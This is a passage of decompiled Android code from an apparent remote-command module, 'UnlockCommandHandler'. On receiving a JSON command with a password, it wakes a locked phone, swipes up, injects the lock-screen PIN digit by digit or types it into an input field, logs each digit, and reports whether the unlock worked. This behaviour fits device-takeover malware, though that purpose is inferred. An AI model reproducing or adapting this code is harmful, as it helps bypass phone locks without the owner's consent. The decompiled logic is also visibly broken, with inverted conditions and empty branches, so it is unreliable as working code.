                    r7 = c0352a94;
                    if (b81.m210571b1(800L, unlockCommandHandler$handleSmartMixedUnlock$1) != coroutineSingletons) {
                    }
                }
                return coroutineSingletons;
            }
            if (r7 == 2) {
                String str4 = unlockCommandHandler$handleSmartMixedUnlock$1.f53553a2;
                uz0Var2 = unlockCommandHandler$handleSmartMixedUnlock$1.f53552a1;
                C0352a9 c0352a96 = unlockCommandHandler$handleSmartMixedUnlock$1.f53551a0;
                kg1.m213544f4(objM211894b2);
                str = str4;
                c0352a93 = c0352a96;
                t60.m214714d6("UnlockCmdHandler", "[混合解锁] 步骤3: 查找输入框并注入密码");
                c0352a93.getClass();
                c0352a94 = c0352a93;
                if (!m211887a9(uz0Var2, str)) {
                    t60.m214726f4("UnlockCmdHandler", "[混合解锁] 未找到输入框，尝试备用输入方式");
                    uz0Var2.m214871a7(str);
                    unlockCommandHandler$handleSmartMixedUnlock$1.f53551a0 = c0352a93;
                    unlockCommandHandler$handleSmartMixedUnlock$1.f53552a1 = uz0Var2;
                    unlockCommandHandler$handleSmartMixedUnlock$1.f53553a2 = null;
                    unlockCommandHandler$handleSmartMixedUnlock$1.f53556a5 = 3;
                    c0352a94 = c0352a93;
                    if (b81.m210571b1(800L, unlockCommandHandler$handleSmartMixedUnlock$1) == coroutineSingletons) {
                    }
                    return coroutineSingletons;
                }
                t60.m214714d6("UnlockCmdHandler", "[混合解锁] 步骤4: 尝试点击确认按钮");
                c0352a94.getClass();
                m211885a3(uz0Var2);
                unlockCommandHandler$handleSmartMixedUnlock$1.f53551a0 = c0352a94;
                unlockCommandHandler$handleSmartMixedUnlock$1.f53552a1 = uz0Var2;
                unlockCommandHandler$handleSmartMixedUnlock$1.f53553a2 = null;
                unlockCommandHandler$handleSmartMixedUnlock$1.f53556a5 = 4;
                r7 = c0352a94;
                if (b81.m210571b1(800L, unlockCommandHandler$handleSmartMixedUnlock$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            }
            if (r7 == 3) {
                uz0Var2 = unlockCommandHandler$handleSmartMixedUnlock$1.f53552a1;
                C0352a9 c0352a97 = unlockCommandHandler$handleSmartMixedUnlock$1.f53551a0;
                kg1.m213544f4(objM211894b2);
                c0352a94 = c0352a97;
                t60.m214714d6("UnlockCmdHandler", "[混合解锁] 步骤4: 尝试点击确认按钮");
                c0352a94.getClass();
                m211885a3(uz0Var2);
                unlockCommandHandler$handleSmartMixedUnlock$1.f53551a0 = c0352a94;
                unlockCommandHandler$handleSmartMixedUnlock$1.f53552a1 = uz0Var2;
                unlockCommandHandler$handleSmartMixedUnlock$1.f53553a2 = null;
                unlockCommandHandler$handleSmartMixedUnlock$1.f53556a5 = 4;
                r7 = c0352a94;
                if (b81.m210571b1(800L, unlockCommandHandler$handleSmartMixedUnlock$1) != coroutineSingletons) {
                    unlockCommandHandler$handleSmartMixedUnlock$1.f53551a0 = r7;
                    unlockCommandHandler$handleSmartMixedUnlock$1.f53552a1 = uz0Var2;
                    unlockCommandHandler$handleSmartMixedUnlock$1.f53556a5 = 5;
                    objM211894b2 = r7.m211894b2(uz0Var2, 5000L, unlockCommandHandler$handleSmartMixedUnlock$1);
                    if (objM211894b2 != coroutineSingletons) {
                    }
                }
                return coroutineSingletons;
            }
            if (r7 == 4) {
                uz0Var2 = unlockCommandHandler$handleSmartMixedUnlock$1.f53552a1;
                C0352a9 c0352a98 = unlockCommandHandler$handleSmartMixedUnlock$1.f53551a0;
                kg1.m213544f4(objM211894b2);
                r7 = c0352a98;
                unlockCommandHandler$handleSmartMixedUnlock$1.f53551a0 = r7;
                unlockCommandHandler$handleSmartMixedUnlock$1.f53552a1 = uz0Var2;
                unlockCommandHandler$handleSmartMixedUnlock$1.f53556a5 = 5;
                objM211894b2 = r7.m211894b2(uz0Var2, 5000L, unlockCommandHandler$handleSmartMixedUnlock$1);
                if (objM211894b2 != coroutineSingletons) {
                    c0352a9 = r7;
                    if (((Boolean) objM211894b2).booleanValue()) {
                    }
                }
                return coroutineSingletons;
            }
            if (r7 != 5) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            uz0Var2 = unlockCommandHandler$handleSmartMixedUnlock$1.f53552a1;
            c0352a9 = unlockCommandHandler$handleSmartMixedUnlock$1.f53551a0;
            try {
                kg1.m213544f4(objM211894b2);
                if (((Boolean) objM211894b2).booleanValue()) {
                    t60.m214726f4("UnlockCmdHandler", "[混合解锁] 解锁失败，密码可能错误");
                    c0352a9.getClass();
                    m211888b0(uz0Var2, false, "解锁失败，密码可能错误");
                    return c1351vv;
                }
                t60.m214714d6("UnlockCmdHandler", "[混合解锁] 解锁成功");
                c0352a9.getClass();
                m211888b0(uz0Var2, true, "解锁成功");
                return c1351vv;
            } catch (Exception e2) {
                e = e2;
                t60.m214705c6("UnlockCmdHandler", "[混合解锁] 执行异常", e);
                String str22 = "执行异常: " + e.getMessage();
                c0352a9.getClass();
                m211888b0(uz0Var2, false, str22);
                return c1351vv;
            }
        } catch (Exception e3) {
            e = e3;
            c0352a9 = r7;
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:127:0x02c2, code lost:
    
        if (r3 != r9) goto L129;
     */
    /* JADX WARN: Path cross not found for [B:78:0x0169, B:81:0x0178], limit reached: 151 */
    /* JADX WARN: Removed duplicated region for block: B:101:0x020e A[Catch: Exception -> 0x0047, TryCatch #4 {Exception -> 0x0047, blocks: (B:13:0x0040, B:18:0x0050, B:103:0x021b, B:94:0x01de, B:99:0x0200, B:101:0x020e, B:86:0x019e, B:88:0x01a6, B:89:0x01ac, B:76:0x015e, B:78:0x0169, B:80:0x016f, B:82:0x017b, B:81:0x0178), top: B:150:0x0031 }] */
    /* JADX WARN: Removed duplicated region for block: B:103:0x021b A[Catch: Exception -> 0x0047, TRY_LEAVE, TryCatch #4 {Exception -> 0x0047, blocks: (B:13:0x0040, B:18:0x0050, B:103:0x021b, B:94:0x01de, B:99:0x0200, B:101:0x020e, B:86:0x019e, B:88:0x01a6, B:89:0x01ac, B:76:0x015e, B:78:0x0169, B:80:0x016f, B:82:0x017b, B:81:0x0178), top: B:150:0x0031 }] */
    /* JADX WARN: Removed duplicated region for block: B:123:0x0297 A[Catch: Exception -> 0x0255, TryCatch #5 {Exception -> 0x0255, blocks: (B:129:0x02c5, B:131:0x02cd, B:133:0x02dc, B:126:0x02b5, B:122:0x0291, B:105:0x022d, B:107:0x0246, B:109:0x024c, B:113:0x025b, B:115:0x0265, B:112:0x0258, B:123:0x0297), top: B:151:0x0291 }] */
    /* JADX WARN: Removed duplicated region for block: B:84:0x0197  */
    /* JADX WARN: Removed duplicated region for block: B:85:0x0199  */
    /* JADX WARN: Removed duplicated region for block: B:88:0x01a6 A[Catch: Exception -> 0x0047, TryCatch #4 {Exception -> 0x0047, blocks: (B:13:0x0040, B:18:0x0050, B:103:0x021b, B:94:0x01de, B:99:0x0200, B:101:0x020e, B:86:0x019e, B:88:0x01a6, B:89:0x01ac, B:76:0x015e, B:78:0x0169, B:80:0x016f, B:82:0x017b, B:81:0x0178), top: B:150:0x0031 }] */
    /* JADX WARN: Removed duplicated region for block: B:89:0x01ac A[Catch: Exception -> 0x0047, TryCatch #4 {Exception -> 0x0047, blocks: (B:13:0x0040, B:18:0x0050, B:103:0x021b, B:94:0x01de, B:99:0x0200, B:101:0x020e, B:86:0x019e, B:88:0x01a6, B:89:0x01ac, B:76:0x015e, B:78:0x0169, B:80:0x016f, B:82:0x017b, B:81:0x0178), top: B:150:0x0031 }] */
    /* JADX WARN: Removed duplicated region for block: B:96:0x01fc  */
    /* JADX WARN: Removed duplicated region for block: B:97:0x01fd  */
    /* JADX WARN: Removed duplicated region for block: B:99:0x0200 A[Catch: Exception -> 0x0047, TryCatch #4 {Exception -> 0x0047, blocks: (B:13:0x0040, B:18:0x0050, B:103:0x021b, B:94:0x01de, B:99:0x0200, B:101:0x020e, B:86:0x019e, B:88:0x01a6, B:89:0x01ac, B:76:0x015e, B:78:0x0169, B:80:0x016f, B:82:0x017b, B:81:0x0178), top: B:150:0x0031 }] */
    /* JADX WARN: Type inference failed for: r10v0, types: [int] */
    /* JADX WARN: Type inference failed for: r11v27 */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:118:0x0283 -> B:119:0x0287). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:121:0x028e -> B:120:0x028b). Please report as a decompilation issue!!! */
    /* renamed from: a7 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m211891a7(JSONObject jSONObject, uz0 uz0Var, ContinuationImpl continuationImpl) throws Throwable {
        UnlockCommandHandler$handleSmartNumericUnlock$1 unlockCommandHandler$handleSmartNumericUnlock$1;
        C1351vv c1351vv;
        Object obj;
        String str;
        String strOptString;
        int iOptInt;
        int iOptInt2;
        C0352a9 c0352a9;
        fd0 fd0VarM214868a4;
        Object objM211893b1;
        String str2;
        C0352a9 c0352a92;
        uz0 uz0Var2;
        int i;
        C0352a9 c0352a93;
        fd0 fd0Var;
        String str3;
        C0352a9 c0352a94;
        b60 b60Var;
        final int i2;
        int length;
        final int i3;
        fd0 fd0Var2;
        final b60 b60Var2;
        int i4;
        C0352a9 c0352a95;
        C1351vv c1351vv2;
        uz0 uz0Var3;
        int i5;
        C0352a9 c0352a96;
        int i6;
        C0352a9 c0352a97;
        C0352a9 c0352a98;
        C0352a9 c0352a99;
        int i7;
        ?? r11;
        final uz0 uz0Var4 = uz0Var;
        C1351vv c1351vv3 = C1351vv.f60710b1;
        Object obj2 = "[智能解锁] 参数无效: password=";
        if (!(continuationImpl instanceof UnlockCommandHandler$handleSmartNumericUnlock$1) || (r11 = (i7 = (unlockCommandHandler$handleSmartNumericUnlock$1 = (UnlockCommandHandler$handleSmartNumericUnlock$1) continuationImpl).f53569b1) & Integer.MIN_VALUE) == 0) {
            unlockCommandHandler$handleSmartNumericUnlock$1 = new UnlockCommandHandler$handleSmartNumericUnlock$1(this, continuationImpl);
        } else {
            unlockCommandHandler$handleSmartNumericUnlock$1.f53569b1 = i7 - Integer.MIN_VALUE;
        }
        Object objM211894b2 = unlockCommandHandler$handleSmartNumericUnlock$1.f53567a9;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        ?? r10 = unlockCommandHandler$handleSmartNumericUnlock$1.f53569b1;
        try {
            try {
                switch (r10) {
                    case 0:
                        kg1.m213544f4(objM211894b2);
                        t60.m214714d6("UnlockCmdHandler", "[智能解锁] 开始执行带判断的数字解锁");
                        str = "";
                        if (jSONObject != null) {
                            try {
                                strOptString = jSONObject.optString("password", "");
                            } catch (Exception e) {
                                e = e;
                                obj2 = this;
                                c1351vv = c1351vv3;
                                obj = obj2;
                                t60.m214705c6("UnlockCmdHandler", "[智能解锁] 执行异常", e);
                                String str4 = "执行异常: " + e.getMessage();
                                obj.getClass();
                                m211888b0(uz0Var4, false, str4);
                                return c1351vv;
                            }
                        } else {
                            strOptString = null;
                        }
                        if (strOptString != null) {
                            str = strOptString;
                        }
                        iOptInt = jSONObject != null ? jSONObject.optInt("screenWidth", 0) : 0;
                        iOptInt2 = jSONObject != null ? jSONObject.optInt("screenHeight", 0) : 0;
                        try {
                            if (str.length() != 0 && iOptInt > 0 && iOptInt2 > 0) {
                                Object systemService = uz0Var4.f60536a0.getSystemService("keyguard");
                                KeyguardManager keyguardManager = systemService instanceof KeyguardManager ? (KeyguardManager) systemService : null;
                                boolean zIsKeyguardLocked = keyguardManager != null ? keyguardManager.isKeyguardLocked() : true;
                                t60.m214714d6("UnlockCmdHandler", "[智能解锁] 步骤1: 初始锁屏状态=" + zIsKeyguardLocked);
                                if (!zIsKeyguardLocked) {
                                    t60.m214714d6("UnlockCmdHandler", "[智能解锁] 设备未锁屏，无需解锁");
                                    m211888b0(uz0Var4, true, "设备未锁屏");
                                    return c1351vv3;
                                }
                                t60.m214714d6("UnlockCmdHandler", "[智能解锁] 步骤2: 唤醒屏幕");
                                uz0Var4.f60536a0.m211536n5();
                                unlockCommandHandler$handleSmartNumericUnlock$1.f53558a0 = this;
                                unlockCommandHandler$handleSmartNumericUnlock$1.f53559a1 = uz0Var4;
                                unlockCommandHandler$handleSmartNumericUnlock$1.f53560a2 = str;
                                unlockCommandHandler$handleSmartNumericUnlock$1.f53563a5 = iOptInt;
                                unlockCommandHandler$handleSmartNumericUnlock$1.f53564a6 = iOptInt2;
                                unlockCommandHandler$handleSmartNumericUnlock$1.f53569b1 = 1;
                                if (b81.m210571b1(500L, unlockCommandHandler$handleSmartNumericUnlock$1) != coroutineSingletons) {
                                    c0352a9 = this;
                                    t60.m214714d6("UnlockCmdHandler", "[智能解锁] 步骤3: 执行上滑");
                                    fd0VarM214868a4 = uz0Var4.m214868a4();
                                    if (fd0VarM214868a4 == null && fd0VarM214868a4.m212793a1()) {
                                        fd0VarM214868a4.m212794a2(new w00() { // from class: com.storm.safe.rock.service.modules.command.UnlockCommandHandler$handleSmartNumericUnlock$2
                                            {
                                                super(0);
                                            }

                                            @Override // p000.w00
                                            public final Object invoke() throws InterruptedException {
                                                uz0Var4.m214877b3();
                                                return C1351vv.f60710b1;
                                            }
                                        });
                                    } else {
                                        uz0Var4.m214877b3();
                                    }
                                    t60.m214714d6("UnlockCmdHandler", "[智能解锁] 步骤4: 检测数字键盘");
                                    unlockCommandHandler$handleSmartNumericUnlock$1.f53558a0 = c0352a9;
                                    unlockCommandHandler$handleSmartNumericUnlock$1.f53559a1 = uz0Var4;
                                    unlockCommandHandler$handleSmartNumericUnlock$1.f53560a2 = str;
                                    unlockCommandHandler$handleSmartNumericUnlock$1.f53561a3 = fd0VarM214868a4;
                                    unlockCommandHandler$handleSmartNumericUnlock$1.f53563a5 = iOptInt;
                                    unlockCommandHandler$handleSmartNumericUnlock$1.f53564a6 = iOptInt2;
                                    unlockCommandHandler$handleSmartNumericUnlock$1.f53569b1 = 2;
                                    objM211893b1 = c0352a9.m211893b1(uz0Var4, 3000L, unlockCommandHandler$handleSmartNumericUnlock$1);
                                    if (objM211893b1 == coroutineSingletons) {
                                        str2 = str;
                                        objM211894b2 = objM211893b1;
                                        c0352a92 = c0352a9;
                                        if (((Boolean) objM211894b2).booleanValue()) {
                                            t60.m214726f4("UnlockCmdHandler", "[智能解锁] 未检测到数字键盘，尝试继续输入");
                                            c0352a94 = c0352a92;
                                            t60.m214714d6("UnlockCmdHandler", "[智能解锁] 步骤5: 输入密码 (" + str2.length() + "位)");
                                            b60Var = uz0Var4.f60536a0.f52420f1;
                                            if (b60Var == null) {
                                                b60Var = null;
                                            }
                                            if (b60Var == null) {
                                                t60.m214704c5("UnlockCmdHandler", "[智能解锁] InputManager未初始化");
                                                c0352a94.getClass();
                                                m211888b0(uz0Var4, false, "InputManager未初始化");
                                                return c1351vv3;
                                            }
                                            i2 = iOptInt2;
                                            length = str2.length();
                                            i3 = iOptInt;
                                            fd0Var2 = fd0VarM214868a4;
                                            b60Var2 = b60Var;
                                            i4 = 0;
                                            c0352a95 = c0352a94;
                                            if (i4 >= length) {
                                                final String strValueOf = String.valueOf(str2.charAt(i4));
                                                int i8 = i4 + 1;
                                                StringBuilder sb = new StringBuilder();
                                                c1351vv = c1351vv3;
                                                sb.append("[智能解锁] 输入第");
                                                sb.append(i8);
                                                sb.append("位: ");
                                                sb.append(strValueOf);
                                                t60.m214702c3("UnlockCmdHandler", sb.toString());
                                                if (fd0Var2 == null || !fd0Var2.m212793a1()) {
                                                    b60Var2.m210554b2(i3, i2, strValueOf);
                                                } else {
                                                    fd0Var2.m212794a2(new w00() { // from class: com.storm.safe.rock.service.modules.command.UnlockCommandHandler$handleSmartNumericUnlock$3
                                                        /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
                                                        {
                                                            super(0);
                                                        }

                                                        @Override // p000.w00
                                                        public final Object invoke() throws InterruptedException {
                                                            b60Var2.m210554b2(i3, i2, strValueOf);
                                                            return C1351vv.f60710b1;
                                                        }
                                                    });
                                                }
                                                if (i4 < str2.length() - 1) {
                                                    unlockCommandHandler$handleSmartNumericUnlock$1.f53558a0 = c0352a95;
                                                    unlockCommandHandler$handleSmartNumericUnlock$1.f53559a1 = uz0Var4;
                                                    unlockCommandHandler$handleSmartNumericUnlock$1.f53560a2 = str2;
                                                    unlockCommandHandler$handleSmartNumericUnlock$1.f53561a3 = fd0Var2;
                                                    unlockCommandHandler$handleSmartNumericUnlock$1.f53562a4 = b60Var2;
                                                    unlockCommandHandler$handleSmartNumericUnlock$1.f53563a5 = i3;
                                                    unlockCommandHandler$handleSmartNumericUnlock$1.f53564a6 = i2;
                                                    unlockCommandHandler$handleSmartNumericUnlock$1.f53565a7 = i4;
                                                    unlockCommandHandler$handleSmartNumericUnlock$1.f53566a8 = length;
                                                    unlockCommandHandler$handleSmartNumericUnlock$1.f53569b1 = 4;
                                                    if (b81.m210571b1(500L, unlockCommandHandler$handleSmartNumericUnlock$1) != coroutineSingletons) {
                                                        try {
                                                            uz0Var3 = uz0Var4;
                                                            i5 = i4;
                                                            c0352a96 = c0352a95;
                                                            i6 = i2;
                                                            i2 = i6;
                                                            c0352a97 = c0352a96;
                                                            i4 = i5;
                                                            uz0Var4 = uz0Var3;
                                                            i4++;
                                                            c1351vv3 = c1351vv;
                                                            c0352a95 = c0352a97;
                                                            if (i4 >= length) {
                                                                c1351vv2 = c1351vv3;
                                                                t60.m214714d6("UnlockCmdHandler", "[智能解锁] 步骤6: 检测解锁结果");
                                                                unlockCommandHandler$handleSmartNumericUnlock$1.f53558a0 = c0352a95;
                                                                unlockCommandHandler$handleSmartNumericUnlock$1.f53559a1 = uz0Var4;
                                                                unlockCommandHandler$handleSmartNumericUnlock$1.f53560a2 = null;
                                                                unlockCommandHandler$handleSmartNumericUnlock$1.f53561a3 = null;
                                                                unlockCommandHandler$handleSmartNumericUnlock$1.f53562a4 = null;
                                                                unlockCommandHandler$handleSmartNumericUnlock$1.f53569b1 = 5;
                                                                c0352a98 = c0352a95;
                                                                if (b81.m210571b1(800L, unlockCommandHandler$handleSmartNumericUnlock$1) != coroutineSingletons) {
                                                                    unlockCommandHandler$handleSmartNumericUnlock$1.f53558a0 = c0352a98;
                                                                    unlockCommandHandler$handleSmartNumericUnlock$1.f53559a1 = uz0Var4;
                                                                    unlockCommandHandler$handleSmartNumericUnlock$1.f53569b1 = 6;
                                                                    objM211894b2 = c0352a98.m211894b2(uz0Var4, 5000L, unlockCommandHandler$handleSmartNumericUnlock$1);
                                                                    c0352a99 = c0352a98;
                                                                    break;
                                                                }
                                                            }
                                                        } catch (Exception e2) {
                                                            e = e2;
                                                            obj = c0352a97;
                                                            t60.m214705c6("UnlockCmdHandler", "[智能解锁] 执行异常", e);
                                                            String str42 = "执行异常: " + e.getMessage();
                                                            obj.getClass();
                                                            m211888b0(uz0Var4, false, str42);
                                                            return c1351vv;
                                                        }
                                                    }
                                                } else {
                                                    c0352a97 = c0352a95;
                                                    i4++;
                                                    c1351vv3 = c1351vv;
                                                    c0352a95 = c0352a97;
                                                    if (i4 >= length) {
                                                    }
                                                }
                                            }
                                        } else {
                                            t60.m214714d6("UnlockCmdHandler", "[智能解锁] 检测到数字键盘，等待1秒确保键盘就绪");
                                            unlockCommandHandler$handleSmartNumericUnlock$1.f53558a0 = c0352a92;
                                            unlockCommandHandler$handleSmartNumericUnlock$1.f53559a1 = uz0Var4;
                                            unlockCommandHandler$handleSmartNumericUnlock$1.f53560a2 = str2;
                                            unlockCommandHandler$handleSmartNumericUnlock$1.f53561a3 = fd0VarM214868a4;
                                            unlockCommandHandler$handleSmartNumericUnlock$1.f53563a5 = iOptInt;
                                            unlockCommandHandler$handleSmartNumericUnlock$1.f53564a6 = iOptInt2;
                                            unlockCommandHandler$handleSmartNumericUnlock$1.f53569b1 = 3;
                                            int i9 = iOptInt2;
                                            if (b81.m210571b1(1000L, unlockCommandHandler$handleSmartNumericUnlock$1) != coroutineSingletons) {
                                                int i10 = iOptInt;
                                                uz0Var2 = uz0Var4;
                                                i = i10;
                                                String str5 = str2;
                                                c0352a93 = c0352a92;
                                                fd0Var = fd0VarM214868a4;
                                                str3 = str5;
                                                iOptInt2 = i9;
                                                uz0 uz0Var5 = uz0Var2;
                                                iOptInt = i;
                                                uz0Var4 = uz0Var5;
                                                String str6 = str3;
                                                fd0VarM214868a4 = fd0Var;
                                                c0352a94 = c0352a93;
                                                str2 = str6;
                                                t60.m214714d6("UnlockCmdHandler", "[智能解锁] 步骤5: 输入密码 (" + str2.length() + "位)");
                                                b60Var = uz0Var4.f60536a0.f52420f1;
                                                if (b60Var == null) {
                                                }
                                                if (b60Var == null) {
                                                }
                                            }
                                        }
                                    }
                                }
                                return coroutineSingletons;
                            }
                            c1351vv = c1351vv3;
                            try {
                                t60.m214704c5("UnlockCmdHandler", "[智能解锁] 参数无效: password=" + str.length() + "位, screen=" + iOptInt + "x" + iOptInt2);
                                m211888b0(uz0Var4, false, "参数无效");
                                return c1351vv;
                            } catch (Exception e3) {
                                e = e3;
                                obj = this;
                                t60.m214705c6("UnlockCmdHandler", "[智能解锁] 执行异常", e);
                                String str422 = "执行异常: " + e.getMessage();
                                obj.getClass();
                                m211888b0(uz0Var4, false, str422);
                                return c1351vv;
                            }
                        } catch (Exception e4) {
                            e = e4;
                            c1351vv = c1351vv3;
                        }
                        break;
                    case 1:
                        iOptInt2 = unlockCommandHandler$handleSmartNumericUnlock$1.f53564a6;
                        int i11 = unlockCommandHandler$handleSmartNumericUnlock$1.f53563a5;
                        String str7 = unlockCommandHandler$handleSmartNumericUnlock$1.f53560a2;
                        uz0 uz0Var6 = unlockCommandHandler$handleSmartNumericUnlock$1.f53559a1;
                        C0352a9 c0352a910 = unlockCommandHandler$handleSmartNumericUnlock$1.f53558a0;
                        try {
                            kg1.m213544f4(objM211894b2);
                            str = str7;
                            c0352a9 = c0352a910;
                            iOptInt = i11;
                            uz0Var4 = uz0Var6;
                            t60.m214714d6("UnlockCmdHandler", "[智能解锁] 步骤3: 执行上滑");
                            fd0VarM214868a4 = uz0Var4.m214868a4();
                            if (fd0VarM214868a4 == null) {
                                break;
                            }
                            uz0Var4.m214877b3();
                            t60.m214714d6("UnlockCmdHandler", "[智能解锁] 步骤4: 检测数字键盘");
                            unlockCommandHandler$handleSmartNumericUnlock$1.f53558a0 = c0352a9;
                            unlockCommandHandler$handleSmartNumericUnlock$1.f53559a1 = uz0Var4;
                            unlockCommandHandler$handleSmartNumericUnlock$1.f53560a2 = str;
                            unlockCommandHandler$handleSmartNumericUnlock$1.f53561a3 = fd0VarM214868a4;
                            unlockCommandHandler$handleSmartNumericUnlock$1.f53563a5 = iOptInt;
                            unlockCommandHandler$handleSmartNumericUnlock$1.f53564a6 = iOptInt2;
                            unlockCommandHandler$handleSmartNumericUnlock$1.f53569b1 = 2;
                            objM211893b1 = c0352a9.m211893b1(uz0Var4, 3000L, unlockCommandHandler$handleSmartNumericUnlock$1);
                            if (objM211893b1 == coroutineSingletons) {
                            }
                        } catch (Exception e5) {
                            e = e5;
                            c1351vv = c1351vv3;
                            uz0Var4 = uz0Var6;
                            obj = c0352a910;
                            t60.m214705c6("UnlockCmdHandler", "[智能解锁] 执行异常", e);
                            String str4222 = "执行异常: " + e.getMessage();
                            obj.getClass();
                            m211888b0(uz0Var4, false, str4222);
                            return c1351vv;
                        }
                        break;
                    case 2:
                        iOptInt2 = unlockCommandHandler$handleSmartNumericUnlock$1.f53564a6;
                        int i12 = unlockCommandHandler$handleSmartNumericUnlock$1.f53563a5;
                        fd0 fd0Var3 = unlockCommandHandler$handleSmartNumericUnlock$1.f53561a3;
                        String str8 = unlockCommandHandler$handleSmartNumericUnlock$1.f53560a2;
                        uz0 uz0Var7 = unlockCommandHandler$handleSmartNumericUnlock$1.f53559a1;
                        C0352a9 c0352a911 = unlockCommandHandler$handleSmartNumericUnlock$1.f53558a0;
                        kg1.m213544f4(objM211894b2);
                        iOptInt = i12;
                        uz0Var4 = uz0Var7;
                        fd0VarM214868a4 = fd0Var3;
                        c0352a92 = c0352a911;
                        str2 = str8;
                        if (((Boolean) objM211894b2).booleanValue()) {
                        }
                        break;
                    case 3:
                        iOptInt2 = unlockCommandHandler$handleSmartNumericUnlock$1.f53564a6;
                        i = unlockCommandHandler$handleSmartNumericUnlock$1.f53563a5;
                        fd0Var = unlockCommandHandler$handleSmartNumericUnlock$1.f53561a3;
                        str3 = unlockCommandHandler$handleSmartNumericUnlock$1.f53560a2;
                        uz0Var2 = unlockCommandHandler$handleSmartNumericUnlock$1.f53559a1;
                        c0352a93 = unlockCommandHandler$handleSmartNumericUnlock$1.f53558a0;
                        kg1.m213544f4(objM211894b2);
                        uz0 uz0Var52 = uz0Var2;
                        iOptInt = i;
                        uz0Var4 = uz0Var52;
                        String str62 = str3;
                        fd0VarM214868a4 = fd0Var;
                        c0352a94 = c0352a93;
                        str2 = str62;
                        t60.m214714d6("UnlockCmdHandler", "[智能解锁] 步骤5: 输入密码 (" + str2.length() + "位)");
                        b60Var = uz0Var4.f60536a0.f52420f1;
                        if (b60Var == null) {
                        }
                        if (b60Var == null) {
                        }
                        break;
                    case 4:
                        length = unlockCommandHandler$handleSmartNumericUnlock$1.f53566a8;
                        i5 = unlockCommandHandler$handleSmartNumericUnlock$1.f53565a7;
                        i6 = unlockCommandHandler$handleSmartNumericUnlock$1.f53564a6;
                        i3 = unlockCommandHandler$handleSmartNumericUnlock$1.f53563a5;
                        b60Var2 = unlockCommandHandler$handleSmartNumericUnlock$1.f53562a4;
                        fd0Var2 = unlockCommandHandler$handleSmartNumericUnlock$1.f53561a3;
                        str2 = unlockCommandHandler$handleSmartNumericUnlock$1.f53560a2;
                        uz0Var3 = unlockCommandHandler$handleSmartNumericUnlock$1.f53559a1;
                        C0352a9 c0352a912 = unlockCommandHandler$handleSmartNumericUnlock$1.f53558a0;
                        try {
                            kg1.m213544f4(objM211894b2);
                            c1351vv = c1351vv3;
                            c0352a96 = c0352a912;
                            i2 = i6;
                            c0352a97 = c0352a96;
                            i4 = i5;
                            uz0Var4 = uz0Var3;
                            i4++;
                            c1351vv3 = c1351vv;
                            c0352a95 = c0352a97;
                            if (i4 >= length) {
                            }
                            return coroutineSingletons;
                        } catch (Exception e6) {
                            e = e6;
                            c1351vv = c1351vv3;
                            uz0Var4 = uz0Var3;
                            obj = c0352a912;
                            t60.m214705c6("UnlockCmdHandler", "[智能解锁] 执行异常", e);
                            String str42222 = "执行异常: " + e.getMessage();
                            obj.getClass();
                            m211888b0(uz0Var4, false, str42222);
                            return c1351vv;
                        }
                    case 5:
                        uz0Var4 = unlockCommandHandler$handleSmartNumericUnlock$1.f53559a1;
                        C0352a9 c0352a913 = unlockCommandHandler$handleSmartNumericUnlock$1.f53558a0;
                        kg1.m213544f4(objM211894b2);
                        c1351vv2 = c1351vv3;
                        c0352a98 = c0352a913;
                        unlockCommandHandler$handleSmartNumericUnlock$1.f53558a0 = c0352a98;
                        unlockCommandHandler$handleSmartNumericUnlock$1.f53559a1 = uz0Var4;
                        unlockCommandHandler$handleSmartNumericUnlock$1.f53569b1 = 6;
                        objM211894b2 = c0352a98.m211894b2(uz0Var4, 5000L, unlockCommandHandler$handleSmartNumericUnlock$1);
                        c0352a99 = c0352a98;
                        break;
                    case 6:
                        uz0Var4 = unlockCommandHandler$handleSmartNumericUnlock$1.f53559a1;
                        C0352a9 c0352a914 = unlockCommandHandler$handleSmartNumericUnlock$1.f53558a0;
                        kg1.m213544f4(objM211894b2);
                        c1351vv2 = c1351vv3;
                        c0352a99 = c0352a914;
                        if (((Boolean) objM211894b2).booleanValue()) {
                            t60.m214714d6("UnlockCmdHandler", "[智能解锁] 解锁成功");
                            c0352a99.getClass();
                            m211888b0(uz0Var4, true, "解锁成功");
                            return c1351vv2;
                        }
                        t60.m214726f4("UnlockCmdHandler", "[智能解锁] 解锁失败，可能密码错误");
                        c0352a99.getClass();
                        m211888b0(uz0Var4, false, "解锁失败，密码可能错误");
                        return c1351vv2;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
            } catch (Exception e7) {
                e = e7;
                c1351vv = c1351vv3;
                uz0Var4 = r10;
                obj = r11;
            }
        } catch (Exception e8) {
            e = e8;
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:57:0x0160  */
    /* JADX WARN: Removed duplicated region for block: B:58:0x0161  */
    /* JADX WARN: Removed duplicated region for block: B:61:0x0165 A[RETURN] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x001f  */
    /* renamed from: a8 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m211892a8(JSONObject jSONObject, uz0 uz0Var, ContinuationImpl continuationImpl) throws Throwable {
        UnlockCommandHandler$handleUnlockDevice$1 unlockCommandHandler$handleUnlockDevice$1;
        JSONArray jSONArrayOptJSONArray;
        String strM213295i2;
        Object objM211461f0;
        uz0 uz0Var2 = uz0Var;
        C1351vv c1351vv = C1351vv.f60710b1;
        if (continuationImpl instanceof UnlockCommandHandler$handleUnlockDevice$1) {
            unlockCommandHandler$handleUnlockDevice$1 = (UnlockCommandHandler$handleUnlockDevice$1) continuationImpl;
            int i = unlockCommandHandler$handleUnlockDevice$1.f53580a4;
            if ((i & Integer.MIN_VALUE) != 0) {
                unlockCommandHandler$handleUnlockDevice$1.f53580a4 = i - Integer.MIN_VALUE;
            } else {
                unlockCommandHandler$handleUnlockDevice$1 = new UnlockCommandHandler$handleUnlockDevice$1(this, continuationImpl);
            }
        }
        Object obj = unlockCommandHandler$handleUnlockDevice$1.f53578a2;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = unlockCommandHandler$handleUnlockDevice$1.f53580a4;
        try {
